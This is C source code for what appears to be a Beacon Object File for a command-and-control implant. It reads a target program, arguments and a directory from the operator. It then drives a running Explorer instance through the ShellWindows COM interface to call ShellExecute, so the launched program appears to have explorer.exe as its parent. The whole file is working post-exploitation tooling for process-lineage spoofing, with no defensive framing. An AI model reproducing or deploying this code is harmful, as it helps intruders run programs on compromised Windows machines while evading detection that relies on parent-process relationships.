#include <windows.h>
#include <objbase.h>
#include <oaidl.h>
#include "beacon.h"

/* ---------- DFR (Dynamic Function Resolution) ---------- */
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$VariantInit(VARIANTARG*);
DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$VariantClear(VARIANTARG*);
DECLSPEC_IMPORT BSTR    WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(BSTR);

/* ---------- GUIDs ---------- */
static const GUID _IID_NULL       = {0,0,0,{0,0,0,0,0,0,0,0}};
static const GUID _IID_IDispatch  = {0x00020400,0,0,{0xC0,0,0,0,0,0,0,0x46}};
static const GUID CLSID_ShellWin  = {0x9BA05972,0xF6A8,0x11CF,{0xA4,0x42,0,0xA0,0xC9,0x0A,0x8F,0x39}};

/* ---------- IDispatch helpers ---------- */

HRESULT DispGetProperty(IDispatch* pDisp, LPOLESTR name, VARIANT* pResult) {
    DISPID dispid;
    HRESULT hr = pDisp->lpVtbl->GetIDsOfNames(pDisp, &_IID_NULL, &name, 1,
        LOCALE_USER_DEFAULT, &dispid);
    if (FAILED(hr)) return hr;
    DISPPARAMS dp = {NULL, NULL, 0, 0};
    OLEAUT32$VariantInit(pResult);
    return pDisp->lpVtbl->Invoke(pDisp, dispid, &_IID_NULL, LOCALE_USER_DEFAULT,
        DISPATCH_PROPERTYGET, &dp, pResult, NULL, NULL);
}

HRESULT DispCallMethod(IDispatch* pDisp, LPOLESTR name,
                       VARIANT* args, DWORD nArgs, VARIANT* pResult) {
    DISPID dispid;
    HRESULT hr = pDisp->lpVtbl->GetIDsOfNames(pDisp, &_IID_NULL, &name, 1,
        LOCALE_USER_DEFAULT, &dispid);
    if (FAILED(hr)) return hr;
    DISPPARAMS dp;
    dp.rgvarg = args;
    dp.cArgs  = nArgs;
    dp.rgdispidNamedArgs = NULL;
    dp.cNamedArgs = 0;
    OLEAUT32$VariantInit(pResult);
    return pDisp->lpVtbl->Invoke(pDisp, dispid, &_IID_NULL, LOCALE_USER_DEFAULT,
        DISPATCH_METHOD | DISPATCH_PROPERTYGET, &dp, pResult, NULL, NULL);
}

/* ---------- BOF Entry ---------- */

void go(char* args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);
    wchar_t* target  = (wchar_t*)BeaconDataExtract(&parser, NULL);
    wchar_t* cmdargs = (wchar_t*)BeaconDataExtract(&parser, NULL);
    wchar_t* dir     = (wchar_t*)BeaconDataExtract(&parser, NULL);
    int show         = BeaconDataInt(&parser);

    /* COM init */
    HRESULT hr = OLE32$CoInitializeEx(NULL, 0x2 /*APARTMENTTHREADED*/);
    BOOL needUninit = SUCCEEDED(hr);
    if (FAILED(hr) && hr != (HRESULT)0x80010106 /*RPC_E_CHANGED_MODE*/) {
        BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx: 0x%08X", hr);
        return;
    }

    /* Connect to running Explorer via ShellWindows */
    IDispatch* pShellWin = NULL;
    hr = OLE32$CoCreateInstance(&CLSID_ShellWin, NULL,
        0x4 /*CLSCTX_LOCAL_SERVER*/, &_IID_IDispatch, (void**)&pShellWin);
    if (FAILED(hr) || !pShellWin) {
        BeaconPrintf(CALLBACK_ERROR, "CoCreateInstance ShellWindows: 0x%08X", hr);
        if (needUninit) OLE32$CoUninitialize();
        return;
    }

    /* Get window count */
    VARIANT vCount;
    hr = DispGetProperty(pShellWin, L"Count", &vCount);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Get Count: 0x%08X", hr);
        pShellWin->lpVtbl->Release(pShellWin);
        if (needUninit) OLE32$CoUninitialize();
        return;
    }
    int count = vCount.lVal;
    BOOL success = FALSE;

    for (int i = 0; i < count && !success; i++) {
        /* Item(i) */
        VARIANT vIdx;
        OLEAUT32$VariantInit(&vIdx);
        vIdx.vt = VT_I4;
        vIdx.lVal = i;

        VARIANT vItem;
        hr = DispCallMethod(pShellWin, L"Item", &vIdx, 1, &vItem);
        if (FAILED(hr) || vItem.vt != VT_DISPATCH || !vItem.pdispVal) {
            OLEAUT32$VariantClear(&vItem);
            continue;
        }
        IDispatch* pBrowser = vItem.pdispVal;

        /* Document */
        VARIANT vDoc;
        hr = DispGetProperty(pBrowser, L"Document", &vDoc);
        if (FAILED(hr) || vDoc.vt != VT_DISPATCH || !vDoc.pdispVal) {
            pBrowser->lpVtbl->Release(pBrowser);
            continue;
        }
        IDispatch* pDoc = vDoc.pdispVal;

        /* Application */
        VARIANT vApp;
        hr = DispGetProperty(pDoc, L"Application", &vApp);
        if (FAILED(hr) || vApp.vt != VT_DISPATCH || !vApp.pdispVal) {
            pDoc->lpVtbl->Release(pDoc);
            pBrowser->lpVtbl->Release(pBrowser);
            continue;
        }
        IDispatch* pApp = vApp.pdispVal;

        /* ShellExecute(file, vArgs, vDir, vOperation, vShow)
           DISPPARAMS args are in REVERSE order */
        VARIANT se[5];
        OLEAUT32$VariantInit(&se[0]); se[0].vt = VT_I4;   se[0].lVal = show;
        OLEAUT32$VariantInit(&se[1]); se[1].vt = VT_BSTR; se[1].bstrVal = OLEAUT32$SysAllocString(L"open");
        OLEAUT32$VariantInit(&se[2]); se[2].vt = VT_BSTR; se[2].bstrVal = OLEAUT32$SysAllocString(dir);
        OLEAUT32$VariantInit(&se[3]); se[3].vt = VT_BSTR; se[3].bstrVal = OLEAUT32$SysAllocString(cmdargs);
        OLEAUT32$VariantInit(&se[4]); se[4].vt = VT_BSTR; se[4].bstrVal = OLEAUT32$SysAllocString(target);

        VARIANT vResult;
        hr = DispCallMethod(pApp, L"ShellExecute", se, 5, &vResult);
        if (SUCCEEDED(hr)) success = TRUE;

        for (int j = 0; j < 5; j++) OLEAUT32$VariantClear(&se[j]);
        OLEAUT32$VariantClear(&vResult);
        pApp->lpVtbl->Release(pApp);
        pDoc->lpVtbl->Release(pDoc);
        pBrowser->lpVtbl->Release(pBrowser);
    }

    pShellWin->lpVtbl->Release(pShellWin);
    if (needUninit) OLE32$CoUninitialize();

    if (success)
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Done (parent = explorer.exe)");
    else
        BeaconPrintf(CALLBACK_ERROR, "[-] No suitable Explorer window found");
}
